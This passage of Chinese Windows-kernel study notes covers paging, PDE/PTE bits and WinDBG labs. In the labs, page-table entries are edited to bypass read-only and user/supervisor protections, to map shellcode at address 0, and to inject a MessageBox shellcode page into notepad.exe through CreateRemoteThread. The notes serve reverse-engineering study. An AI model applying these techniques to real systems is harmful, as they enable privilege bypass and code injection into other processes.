那么有效 如果PDE.p&#x3D;1 PS&#x3D;0, PTE.p&#x3D;1 PTE.PAT&#x3D;0, 有效 101012下页表基址计算 汇编代码 MiIsAddressValid（线性地址有效性验证函数） 12345678910111213141516171819202122232425262728293031.text:0048DBB8 mov eax, ecx.text:0048DBBA shr eax, 14h ; 右移动 20位 eax &gt;&gt; 20.text:0048DBBD and eax, 0FFCh ; (eax &gt;&gt; 20) &amp; ffc.text:0048DBC2 sub eax, 3FD00000h.text:0048DBC7 mov eax, [eax] ; C0300000是一个起始地址.text:0048DBC9 test al, 1.text:0048DBCB jnz short loc_48DBD0.text:0048DBCD.text:0048DBCD loc_48DBCD: ; CODE XREF: MiIsAddressValid(x,x)+32↓j.text:0048DBCD xor al, al.text:0048DBCF retn.text:0048DBD0 ; ---------------------------------------------------------------------------.text:0048DBD0.text:0048DBD0 loc_48DBD0: ; CODE XREF: MiIsAddressValid(x,x)+13↑j.text:0048DBD0 test al, al.text:0048DBD2 jns short loc_48DBD7 ; 判断是否是大页.text:0048DBD4 mov al, 1.text:0048DBD6 retn.text:0048DBD7 ; ---------------------------------------------------------------------------.text:0048DBD7.text:0048DBD7 loc_48DBD7: ; CODE XREF: MiIsAddressValid(x,x)+1A↑j.text:0048DBD7 shr ecx, 0Ah.text:0048DBDA and ecx, 3FFFFCh.text:0048DBE0 sub ecx, 40000000h ; C0000000.text:0048DBE6 mov eax, [ecx].text:0048DBE8 test al, 1 ; PTE.text:0048DBEA jz short loc_48DBCD.text:0048DBEC and al, 80h.text:0048DBEE cmp al, 80h.text:0048DBF0 setnz al.text:0048DBF3 retn C0300000 PDE基址C0300000 + ((线性地址 &gt;&gt; 0x14) &amp; 0xFFC) C0000000 PTE基址C000000 + ((线性地址 &gt;&gt; 0xA) &amp; 0x3FFFFC) PAE 最大能支持36根地址总线2^32 &#x3D; 4G2^33 &#x3D; 4G * 2 &#x3D; 8G2^36 &#x3D; 4G*2^4 &#x3D; 64G 2-9-9-12分页 2^2 &#x3D; 4, 有4种（00, 01, 10, 11）, 所以CR3是以0x20来递增的; 作业 2-9-9-12拆法; 逆向分析2-9-9-12分页模式下内核函数MmIsAddressValied; 通过调用门进入R0修改高2G的所有PDE、PTE的u&#x2F;s位, 然后返回应用层访问高地址, 分页模式10-10-12;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-页表","slug":"Windows内核-页表","date":"2024-10-14T01:22:18.000Z","updated":"2024-10-17T01:01:20.225Z","comments":true,"path":"1d0822fc.html","link":"","permalink":"http://example.com/1d0822fc.html","excerpt":"页表","text":"页表 知识点内核文件 32位特有的 如果是29912分页, 运行的内核 ntkrnlpa.exe; 如果是101012分页, 运行的内核 ntoskrnl.exe; C:\\Windows\\System32\\drivers目录下保存的都是一些系统驱动; 线性地址一致, 为什么内存数据不一致 物理内存小于虚拟内存 物理地址的拆分 10-10-12分页拆分 在notepad中键入字符串后使用CE找到该字符串的逻辑地址: 0009DE08 拆分地址0009DE08 &#x3D;&gt; 0000 0000 0000 | 0000 1001 1101 | 1110 0000 10000000 0000 0000 &#x3D;&gt; 0 &#x2F;&#x2F; 页目录项0000 1001 1101 &#x3D;&gt; 09D &#x2F;&#x2F; 页表项1110 0000 1000 &#x3D;&gt; E08 &#x2F;&#x2F; 页内偏移 在WinDBG中查找123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 首先使用命令!process 0 0找到notepad进程的CR3// 注意：物理内存要使用感叹号(!)kd&gt; !dd 32f99000 // notepad进程的CR3（代表这本书）#32f99000 1c1ce867 25e09867 1c16c867 18485867#32f99010 00000000 00000000 00000000 00000000#32f99020 05265867 17c66867 00000000 00000000#32f99030 00000000 00000000 00000000 00000000#32f99040 00000000 00000000 00000000 00000000#32f99050 00000000 00000000 00000000 00000000#32f99060 00000000 00000000 00000000 00000000#32f99070 00000000 00000000 00000000 00000000kd&gt; !dd 32f99000+0*4 // 每一项代表的是指针, 32位下为4字节, 所以需要乘以4#32f99000 1c1ce867 25e09867 1c16c867 18485867#32f99010 00000000 00000000 00000000 00000000#32f99020 05265867 17c66867 00000000 00000000#32f99030 00000000 00000000 00000000 00000000#32f99040 00000000 00000000 00000000 00000000#32f99050 00000000 00000000 00000000 00000000#32f99060 00000000 00000000 00000000 00000000#32f99070 00000000 00000000 00000000 00000000kd&gt; !dd 1c1ce000+09D*4 // 去除最后的12位（后面的12位在页目录下代表了注意事项, 也就是属性）, 然后加上页表项09D#1c1ce274 2cea5867 212fc867 27c7e867 2d13f867#1c1ce284 20f43867 28843867 286c3867 03244867#1c1ce294 02b85847 3038b867 0a4ca847 00000000#1c1ce2a4 00000000 00000000 00000000 00000000#1c1ce2b4 00000000 00000000 00000000 00000000#1c1ce2c4 00000000 00000000 00000000 00000000#1c1ce2d4 00000000 00000000 00000000 00000000#1c1ce2e4 00000000 00000000 00000000 00000000kd&gt; !dd 2cea5000+E08 // 同样去除后12位后加上页内偏移后找到这个字#2cea5e08 00620061 00640063 00320031 00340033#2cea5e18 00370035 00000000 00000000 00000000#2cea5e28 00000000 00000000 00000000 00000000#2cea5e38 00000000 00000000 00000000 00000000#2cea5e48 00000000 005f0004 59f3c08e 0800730b#2cea5e58 000a1aa0 000a1c20 5cf3c08b 08007303#2cea5e68 00000409 0019f2e0 0019f220 0019f2e0#2cea5e78 001865cc 00000003 0019ee7c 00000000kd&gt; !db 2cea5000+E08#2cea5e08 61 00 62 00 63 00 64 00-31 00 32 00 33 00 34 00 a.b.c.d.1.2.3.4.#2cea5e18 35 00 37 00 00 00 00 00-00 00 00 00 00 00 00 00 5.7.............#2cea5e28 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#2cea5e38 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#2cea5e48 00 00 00 00 04 00 5f 00-8e c0 f3 59 0b 73 00 08 ......_....Y.s..#2cea5e58 a0 1a 0a 00 20 1c 0a 00-8b c0 f3 5c 03 73 00 08 .... ......\\.s..#2cea5e68 09 04 00 00 e0 f2 19 00-20 f2 19 00 e0 f2 19 00 ........ .......#2cea5e78 cc 65 18 00 03 00 00 00-7c ee 19 00 00 00 00 00 .e......|....... 计算一次缓存的字节数 总字节数 &#x2F; linesize &#x2F; x way &#x3D; y组y 组 &#x2F; x way &#x3D; 1组z行 z行 * linesize &#x3D; 一组缓存的字节数(32K * 1024) &#x2F; 64 &#x2F; 8 &#x3D; 总组数（64）64（总组数） &#x2F; 8 &#x3D; 8行8 * 64字节 &#x3D; 512组的字节数 P_US_RW PDE和PTE是与的关系（PDE.arr &amp; PTE.arr）, 最后得出为1的才是有效的; P位 如果是PDE的P位置0, 那么代表PTT为无效;如果是PTE的P为置0, 那么代表物理页为无效; R&#x2F;W位 R&#x2F;W位为0, 代表只读;R&#x2F;W位为1, 代表可写; 代码实验 拆分地址a57 b30 &#x3D;&gt; 0000 0000 10 | 10 0101 0111 | 1011 0011 00000000 0000 0010 &#x3D;&gt; 20010 0101 0111 &#x3D;&gt; 2571011 0011 0000 &#x3D;&gt; b30 WinDBG中设置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849kd&gt; !dd 1622e000+2*4 // 1622e000为实验程序的CR3, PDE(18996867)最后一位为7(0111), 证明可写#1622e008 18996867 00000000 00000000 00000000#1622e018 00000000 00000000 00000000 00000000#1622e028 00000000 00000000 00000000 00000000#1622e038 00000000 00000000 00000000 00000000#1622e048 00000000 00000000 00000000 00000000#1622e058 00000000 00000000 00000000 00000000#1622e068 00000000 00000000 00000000 00000000#1622e078 00000000 00000000 00000000 00000000kd&gt; !dd 18996000+257*4 // 去除后12位加上页表项乘以4, PTE(0abb8005)最后一位为5(0101), 证明不可写#1899695c 0abb8005 1cc79005 00000000 19352847#1899696c 31ba6005 09e2f205 3685e005 3d0da005#1899697c 00000000 00000000 00000000 00000000#1899698c 00000000 00000000 00000000 00000000#1899699c 00000000 00000000 00000000 00000000#189969ac 00000000 00000000 00000000 00000000#189969bc 00000000 00000000 00000000 00000000#189969cc 00000000 00000000 00000000 00000000kd&gt; !ed 1899695c 0abb8007 // 将0abb8005修改为0abb8007, PTE(0abb8007)最后一位为7(0111), &amp;之后R/W位为1, 修改为可写状态kd&gt; !dd 0abb8000+b30# abb8b30 61647361 73676473 00616664 00000000# abb8b40 0a0d7825 00000000 73756170 00000065# abb8b50 0a0d7325 00000000 00a57c18 00a57d28# abb8b60 00a57e80 00a57ea4 00a57ee4 00a57f18# abb8b70 00000001 00000000 00000001 00000001# abb8b80 00000001 00000001 63617453 7261206b# abb8b90 646e756f 65687420 72617620 6c626169# abb8ba0 00272065 61772027 6f632073 70757272kd&gt; !db 0abb8000+b30 // 实验程序中的字符串# abb8b30 61 73 64 61 73 64 67 73-64 66 61 00 00 00 00 00 asdasdgsdfa.....# abb8b40 25 78 0d 0a 00 00 00 00-70 61 75 73 65 00 00 00 %x......pause...# abb8b50 25 73 0d 0a 00 00 00 00-18 7c a5 00 28 7d a5 00 %s.......|..(&#125;..# abb8b60 80 7e a5 00 a4 7e a5 00-e4 7e a5 00 18 7f a5 00 .~...~...~......# abb8b70 01 00 00 00 00 00 00 00-01 00 00 00 01 00 00 00 ................# abb8b80 01 00 00 00 01 00 00 00-53 74 61 63 6b 20 61 72 ........Stack ar# abb8b90 6f 75 6e 64 20 74 68 65-20 76 61 72 69 61 62 6c ound the variabl# abb8ba0 65 20 27 00 27 20 77 61-73 20 63 6f 72 72 75 70 e &#x27;.&#x27; was corrupkd&gt; gnt!RtlpBreakWithStatusInstruction:84066ed0 cc int 3kd&gt; !db 0abb8000+b30 // 已经被修改# abb8b30 31 73 64 61 73 64 67 73-64 66 61 00 00 00 00 00 1sdasdgsdfa.....# abb8b40 25 78 0d 0a 00 00 00 00-70 61 75 73 65 00 00 00 %x......pause...# abb8b50 25 73 0d 0a 00 00 00 00-18 7c a5 00 28 7d a5 00 %s.......|..(&#125;..# abb8b60 80 7e a5 00 a4 7e a5 00-e4 7e a5 00 18 7f a5 00 .~...~...~......# abb8b70 01 00 00 00 00 00 00 00-01 00 00 00 01 00 00 00 ................# abb8b80 01 00 00 00 01 00 00 00-53 74 61 63 6b 20 61 72 ........Stack ar# abb8b90 6f 75 6e 64 20 74 68 65-20 76 61 72 69 61 62 6c ound the variabl# abb8ba0 65 20 27 00 27 20 77 61-73 20 63 6f 72 72 75 70 e &#x27;.&#x27; was corrup 代码 123456789101112131415161718192021// 10_14_PageProperties(页属性).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; char *x = (char*)&quot;asdasdgsdfa&quot;; printf(&quot;%x\\r\\n&quot;, x); system(&quot;pause&quot;); printf(&quot;%s\\r\\n&quot;, x); x[0] = &#x27;1&#x27;; printf(&quot;%s\\r\\n&quot;, x); system(&quot;pause&quot;); return 0;&#125; U&#x2F;S位（user&#x2F;super） 如果U&#x2F;S位为0, 代表只有内核可以访问页;如果U&#x2F;S位为1, 代表三环可以访问页; 代码实验 拆分地址80b98800 &#x3D;&gt; 0010 0000 0010 | 0011 1001 1000 | 1000 0000 00000010 0000 0010 &#x3D;&gt; 202 &#x2F;&#x2F; 前面的往后移, 前面补00011 1001 1000 &#x3D;&gt; 3981000 0000 0000 &#x3D;&gt; 100 查询gdtr属性 12345kd&gt; !pte 0x80b98800 // 查询默认gdtr地址 VA 80b98800PDE at C0300808 PTE at C0202E60contains 0018A063 contains 00B98163 // 最后一位是3（0011）, 代表P位和R/W位有值, U/S位为0, 意味着用户模式下访问不到, 只能内核访问pfn 18a ---DA--KWEV pfn b98 -G-DA--KWEV WinDBG中设置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960kd&gt; !dd 0199a000+202*4 // 获取当前进程的PDE# 199a808 0018a063 3d3c7863 001b7063 001b8063# 199a818 001b9063 001ba063 001bb063 001bc063# 199a828 001bd063 001be063 001bf063 21a3c863# 199a838 210aa863 001c2063 001c3063 001c4063# 199a848 00000000 00000000 001c7063 05400863# 199a858 05801863 3fec0863 3fe81863 3fe82863# 199a868 3fe83863 3fe84863 3fe85863 3fe86863# 199a878 3fe87863 18c23863 3a3a8863 3d3c3863kd&gt; !ed 199a808 0018a067 // 设置PDE中U/S位为1kd&gt; !dd 0199a000+202*4# 199a808 0018a067 3d3c7863 001b7063 001b8063# 199a818 001b9063 001ba063 001bb063 001bc063# 199a828 001bd063 001be063 001bf063 21a3c863# 199a838 210aa863 001c2063 001c3063 001c4063# 199a848 00000000 00000000 001c7063 05400863# 199a858 05801863 3fec0863 3fe81863 3fe82863# 199a868 3fe83863 3fe84863 3fe85863 3fe86863# 199a878 3fe87863 18c23863 3a3a8863 3d3c3863kd&gt; !dd 0018a000+398*4 // 查询当前进程的PTE# 18ae60 00b98163 00b99163 00b9a163 00b9b163# 18ae70 00b9c163 00b9d163 00b9e163 00b9f163# 18ae80 00ba0163 00000000 00000000 00000000# 18ae90 00000000 00000000 00000000 00000000# 18aea0 00000000 00000000 00000000 00000000# 18aeb0 00bac963 00bad121 00bae121 00baf963# 18aec0 03d01060 00000000 00000000 00000000# 18aed0 00000000 00000000 00000000 00000000kd&gt; !ed 18ae60 00b98167 // 设置PTE的U/S位为1kd&gt; !dd 0018a000+398*4# 18ae60 00b98167 00b99163 00b9a163 00b9b163# 18ae70 00b9c163 00b9d163 00b9e163 00b9f163# 18ae80 00ba0163 00000000 00000000 00000000# 18ae90 00000000 00000000 00000000 00000000# 18aea0 00000000 00000000 00000000 00000000# 18aeb0 00bac963 00bad121 00bae121 00baf963# 18aec0 03d01060 00000000 00000000 00000000# 18aed0 00000000 00000000 00000000 00000000kd&gt; !vtop 0199a000 0x80b98800 // 查询当前进程的CR3信息X86VtoP: Virt 0000000080b98800, pagedir 000000000199a000X86VtoP: PDE 000000000199a808 - 0018a067X86VtoP: PTE 000000000018ae60 - 00b98167X86VtoP: Mapped phys 0000000000b98800Virtual address 80b98800 translates to physical address b98800.kd&gt; !ed 18ae60 00b98067 // 设置PTE的G位为1kd&gt; !dd 0018a000+398*4# 18ae60 00b98067 00b99163 00b9a163 00b9b163# 18ae70 00b9c163 00b9d163 00b9e163 00b9f163# 18ae80 00ba0163 00000000 00000000 00000000# 18ae90 00000000 00000000 00000000 00000000# 18aea0 00000000 00000000 00000000 00000000# 18aeb0 00bac963 00bad121 00bae121 00baf963# 18aec0 03d01060 00000000 00000000 00000000# 18aed0 00000000 00000000 00000000 00000000kd&gt; !vtop 0199a000 0x80b98800 // 查询当前进程的CR3信息X86VtoP: Virt 0000000080b98800, pagedir 000000000199a000X86VtoP: PDE 000000000199a808 - 0018a067X86VtoP: PTE 000000000018ae60 - 00b98067X86VtoP: Mapped phys 0000000000b98800Virtual address 80b98800 translates to physical address b98800. 实验代码 123456789101112131415161718192021222324// 10_14_PageProperties(页属性).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; // u/s位代码试验 char buf[6] = &#123; 0 &#125;; __asm &#123; sgdt buf; &#125; int address = *(PULONG)&amp;buf[2]; int * x = (int*)address; system(&quot;pause&quot;); printf(&quot;%x\\r\\n&quot;, *x); system(&quot;pause&quot;); return 0;&#125; A位 不是人为设置, 如果从来没有访问过可能是个0, 一旦访问过一次（读或者写）就会变成1; G位（全局页）挂页（幽灵地址）申请内存并挂到0地址上 拆地址1d0000 &#x3D;&gt; 0000 0000 00 | 01 1101 0000 | 0000 0000 00000000 0000 0000 &#x3D;&gt; 00001 1101 0000 &#x3D;&gt; 1d00000 0000 0000 &#x3D;&gt; 0 WinDBG中设置PTE: 04922847 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778kd&gt; !dd 1c2c5000 // 通过CR3获取PDE#1c2c5000 23325867 06e4b867 00000000 376e3867#1c2c5010 00000000 00000000 00000000 00000000#1c2c5020 00000000 00000000 00000000 00000000#1c2c5030 00000000 00000000 00000000 00000000#1c2c5040 00000000 00000000 00000000 00000000#1c2c5050 00000000 00000000 00000000 00000000#1c2c5060 00000000 00000000 00000000 00000000#1c2c5070 00000000 00000000 00000000 00000000kd&gt; !dd 23325000+1d0*4 // 获取PTE#23325740 04922847 00000000 00000000 00000000#23325750 00000000 00000000 00000000 00000000#23325760 00000000 00000000 00000000 00000000#23325770 00000000 00000000 00000000 00000000#23325780 00000000 00000000 00000000 00000000#23325790 00000000 00000000 00000000 00000000#233257a0 00000000 00000000 00000000 00000000#233257b0 00000000 00000000 00000000 00000000kd&gt; !dd 04922000 // 查看PTE# 4922000 00000000 00000000 00000000 00000000# 4922010 00000000 00000000 00000000 00000000# 4922020 00000000 00000000 00000000 00000000# 4922030 00000000 00000000 00000000 00000000# 4922040 00000000 00000000 00000000 00000000# 4922050 00000000 00000000 00000000 00000000# 4922060 00000000 00000000 00000000 00000000# 4922070 00000000 00000000 00000000 00000000kd&gt; !dd 1c2c5000 // 获取PDE#1c2c5000 23325867 06e4b867 00000000 376e3867#1c2c5010 00000000 00000000 00000000 00000000#1c2c5020 00000000 00000000 00000000 00000000#1c2c5030 00000000 00000000 00000000 00000000#1c2c5040 00000000 00000000 00000000 00000000#1c2c5050 00000000 00000000 00000000 00000000#1c2c5060 00000000 00000000 00000000 00000000#1c2c5070 00000000 00000000 00000000 00000000kd&gt; !dd 23325000 // 查看PDE#23325000 00000000 00000000 00000000 00000000#23325010 00000000 00000000 00000000 00000000#23325020 00000000 00000000 00000000 00000000#23325030 00000000 00000000 00000000 00000000#23325040 0b841847 00000000 00000000 00000000#23325050 00000000 00000000 00000000 00000000#23325060 00000000 00000000 00000000 00000000#23325070 00000000 00000000 00000000 00000000kd&gt; !ed 23325000 04922847 // 将PDE指针指向PTE的值（04922847）kd&gt; !dd 23325000#23325000 04922847 00000000 00000000 00000000#23325010 00000000 00000000 00000000 00000000#23325020 00000000 00000000 00000000 00000000#23325030 00000000 00000000 00000000 00000000#23325040 0b841847 00000000 00000000 00000000#23325050 00000000 00000000 00000000 00000000#23325060 00000000 00000000 00000000 00000000#23325070 00000000 00000000 00000000 00000000kd&gt; gBreak instruction exception - code 80000003 (first chance)nt!RtlpBreakWithStatusInstruction:84066ed0 cc int 3kd&gt; !dd 23325000#23325000 04922867 00000000 00000000 00000000#23325010 00000000 00000000 00000000 00000000#23325020 00000000 00000000 00000000 00000000#23325030 00000000 00000000 00000000 00000000#23325040 0b841847 00000000 00000000 00000000#23325050 00000000 00000000 00000000 00000000#23325060 00000000 00000000 00000000 00000000#23325070 00000000 00000000 00000000 00000000kd&gt; !db 04922000 // 成功修改成100（0x64）# 4922000 64 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 d...............# 4922010 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 4922020 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 4922030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 4922040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 4922050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 4922060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# 4922070 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 实验代码 12345678910111213141516171819202122// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; int * x = 0; int * mem = (int*)VirtualAlloc(NULL, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memset(mem, 0, 0x1000); printf(&quot;%x\\r\\n&quot;, mem); system(&quot;pause&quot;); *x = 100; system(&quot;pause&quot;); printf(&quot;%d\\r\\n&quot;, *mem); system(&quot;pause&quot;); return 0;&#125; 在本进程中的0地址上执行shellcode 拆地址2f0000 &#x3D;&gt; 0000 0000 00 | 10 1111 0000 | 0000 0000 00000000 0000 0000 &#x3D;&gt; 00010 1111 0000 &#x3D;&gt; 2f00000 0000 0000 &#x3D;&gt; 0 WinDBG中设置PTE: 0a512867 12345678910111213141516171819202122232425262728293031323334353637kd&gt; !dd 20f6a000 // 根据进程CR3获取PDE#20f6a000 38736867 03c45867 00000000 00000000#20f6a010 00000000 00000000 00000000 00000000#20f6a020 00000000 00000000 00000000 00000000#20f6a030 00000000 00000000 00000000 00000000#20f6a040 00000000 00000000 00000000 00000000#20f6a050 00000000 00000000 00000000 00000000#20f6a060 00000000 00000000 00000000 00000000#20f6a070 00000000 00000000 00000000 00000000kd&gt; !dd 38736000+2f0*4 // 获取PTE#38736bc0 0a512867 00000000 00000000 00000000#38736bd0 00000000 00000000 00000000 00000000#38736be0 00000000 00000000 00000000 00000000#38736bf0 00000000 00000000 00000000 00000000#38736c00 00000000 00000000 00000000 00000000#38736c10 00000000 00000000 00000000 00000000#38736c20 00000000 00000000 00000000 00000000#38736c30 00000000 00000000 00000000 00000000kd&gt; !db 0a512000 // 查看数据# a512000 6a 00 6a 00 6a 00 6a 00-b8 b1 ed da 75 ff d0 c3 j.j.j.j.....u...# a512010 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# a512020 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# a512030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# a512040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# a512050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# a512060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................# a512070 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................kd&gt; !dd 38736000 // 查看0地址#38736000 00000000 00000000 00000000 00000000#38736010 00000000 00000000 00000000 00000000#38736020 00000000 00000000 00000000 00000000#38736030 00000000 00000000 00000000 00000000#38736040 0c350847 00000000 00000000 00000000#38736050 00000000 00000000 00000000 00000000#38736060 00000000 00000000 00000000 00000000#38736070 00000000 00000000 00000000 00000000kd&gt; !ed 38736000 0a512867 // 将PTE（0a512867）挂到0地址上 实验代码 123456789101112131415161718192021222324252627282930313233343536373839404142// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;typedef void(__stdcall * FuncProc)();int main()&#123; int * mem = (int*)VirtualAlloc(NULL, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE); FuncProc func = NULL; memset(mem, 0, 0x1000); char bufcode[] = &#123; 0x6A, 0, // push 0 0x6A, 0, // push 0 0x6A, 0, // push 0 0x6A, 0, // push 0 0xb8, 0, 0, 0, 0, // mov eax, 0x12345678 0xff, 0xd0, // call eax 0xc3, // ret &#125;; *(int*)&amp;bufcode[9] = (ULONG)MessageBoxA; memcpy(mem, bufcode, sizeof(bufcode)); printf(&quot;%x\\r\\n&quot;, mem); system(&quot;pause&quot;); // FuncProc func = (FuncProc)mem; func(); system(&quot;pause&quot;); printf(&quot;%d\\r\\n&quot;, *mem); system(&quot;pause&quot;); return 0;&#125; 将物理页挂到其他进程并执行shellcode注意该实验无法在cheatengine-i386.exe（CE）上成功复现, 在notepad.exe上成功复现; 拆地址180000 &#x3D;&gt; 0000 0000 00 | 01 1000 0000 | 0000 0000 00000000 0000 0000 &#x3D;&gt; 00001 1000 0000 &#x3D;&gt; 1800000 0000 0000 &#x3D;&gt; 0 WinDBG中设置 notepad.exe进程信息PROCESS 87460570 SessionId: 1 Cid: 0978 Peb: 7ffda000 ParentCid: 0a48 DirBase: 015de000 ObjectTable: b3a87c30 HandleCount: 60. Image: notepad.exe 实验进程信息PROCESS 87620030 SessionId: 1 Cid: 03f8 Peb: 7ffdc000 ParentCid: 060c DirBase: 03005000 ObjectTable: a4d11110 HandleCount: 19. Image: 10_16_HangingPage(¹ÒÒ³).exe 12345678910111213141516171819202122232425262728293031323334353637383940414243444546kd&gt; !dd 03005000 // 首先通过本进程的CR3获取PDE# 3005000 22edd867 1fd2e867 00000000 00000000# 3005010 00000000 00000000 00000000 00000000# 3005020 00000000 00000000 00000000 00000000# 3005030 00000000 00000000 00000000 00000000# 3005040 00000000 00000000 00000000 00000000# 3005050 00000000 00000000 00000000 00000000# 3005060 00000000 00000000 00000000 00000000# 3005070 00000000 00000000 00000000 00000000kd&gt; !dd 22edd000+180*4 // 获取本进程的PTE#22edd600 27e84867 00000000 00000000 00000000#22edd610 00000000 00000000 00000000 00000000#22edd620 00000000 00000000 00000000 00000000#22edd630 00000000 00000000 00000000 00000000#22edd640 39944005 381d4867 1fdd5867 021d6867#22edd650 36457867 29bd8867 1d119867 22b1a867#22edd660 3175c867 30d5d867 2e620867 291a1867#22edd670 29f21867 14a62867 253e2867 03c23867kd&gt; !db 27e84000 // 查看数据#27e84000 6a 00 6a 00 6a 00 6a 00-b8 b1 ed da 75 ff d0 c3 j.j.j.j.....u...#27e84010 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#27e84020 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#27e84030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#27e84040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#27e84050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#27e84060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................#27e84070 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................kd&gt; !dd 015de000 // 通过notepad.exe的CR3获取PDE# 15de000 3b822867 37a23867 0c64e867 07f55867# 15de010 00000000 00000000 00000000 29faf867# 15de020 285b3867 38cf1867 023f5867 04737867# 15de030 00000000 00000000 00000000 00000000# 15de040 00000000 00000000 00000000 00000000# 15de050 00000000 00000000 00000000 00000000# 15de060 00000000 00000000 00000000 00000000# 15de070 00000000 00000000 00000000 00000000kd&gt; !dd 3b822000 // 查看notepad.exe的PTE#3b822000 00000000 00000000 00000000 00000000#3b822010 00000000 00000000 00000000 00000000#3b822020 00000000 00000000 00000000 00000000#3b822030 00000000 00000000 00000000 00000000#3b822040 321f8847 00000000 00000000 00000000#3b822050 00000000 00000000 00000000 00000000#3b822060 00000000 00000000 00000000 00000000#3b822070 00000000 00000000 00000000 00000000kd&gt; !ed 3b822000 27e84867 // 将进程的PTE挂到notepad.exe的0地址上 实验代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// 10_16_HangingPage(挂页).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;typedef void(__stdcall * FuncProc)();int main()&#123; int * mem = (int*)VirtualAlloc(NULL, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE); FuncProc func = NULL; memset(mem, 0, 0x1000); char bufcode[] = &#123; 0x6A, 0, // push 0 0x6A, 0, // push 0 0x6A, 0, // push 0 0x6A, 0, // push 0 0xb8, 0, 0, 0, 0, // mov eax, 0x12345678 0xff, 0xd0, // call eax 0xc3, // ret &#125;; *(int*)&amp;bufcode[9] = (ULONG)MessageBoxA; memcpy(mem, bufcode, sizeof(bufcode)); printf(&quot;%x\\r\\n&quot;, mem); system(&quot;pause&quot;); // FuncProc func = (FuncProc)mem; // func(); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2424); if (INVALID_HANDLE_VALUE == hProcess) &#123; printf(&quot;OpenProcess Failed\\r\\n&quot;); &#125; HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, NULL, NULL, NULL, NULL); if (INVALID_HANDLE_VALUE == hThread) &#123; printf(&quot;CreateRemoteThread Failed\\r\\n&quot;); &#125; WaitForSingleObject(hThread, 0); CloseHandle(hThread); CloseHandle(hProcess); system(&quot;pause&quot;); printf(&quot;%d\\r\\n&quot;, *mem); system(&quot;pause&quot;); return 0;&#125; 带页内偏移挂页 拆地址80000 &#x3D;&gt; 0000 0000 00 | 00 1000 0000 | 0000 0000 00000000 0000 0000 &#x3D;&gt; 00000 1000 0000 &#x3D;&gt; 0800000 0000 0000 &#x3D;&gt; 0 WinDBG中设置 notepad.exe进程信息PROCESS 87564030 SessionId: 1 Cid: 129c Peb: 7ffdf000 ParentCid: 0a48 DirBase: 34cc7000 ObjectTable: 95581928 HandleCount: 60. Image: notepad.exe 实验程序进程信息PROCESS 86d307c8 SessionId: 1 Cid: 151c Peb: 7ffd9000 ParentCid: 1478 DirBase: 1611b000 ObjectTable: 954c7388 HandleCount: 19. Image: 10_16_HangingPage(¹ÒÒ³).exe 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556kd&gt; !dd 1611b000 // 通过实验程序获取PDE#1611b000 2915f867 0c066867 00000000 05cdc867#1611b010 00000000 00000000 00000000 00000000#1611b020 00000000 00000000 00000000 00000000#1611b030 00000000 00000000 00000000 00000000#1611b040 00000000 00000000 00000000 00000000#1611b050 00000000 00000000 00000000 00000000#1611b060 00000000 00000000 00000000 00000000#1611b070 00000000 00000000 00000000 00000000kd&gt; !dd 2915f000+080*4 // 获取PTE#2915f200 06204867 00000000 00000000 00000000#2915f210 00000000 00000000 00000000 00000000#2915f220 00000000 00000000 00000000 00000000#2915f230 00000000 00000000 00000000 00000000#2915f240 00000000 00000000 00000000 00000000#2915f250 00000000 00000000 00000000 00000000#2915f260 00000000 00000000 00000000 00000000#2915f270 00000000 00000000 00000000 00000000kd&gt; !dd 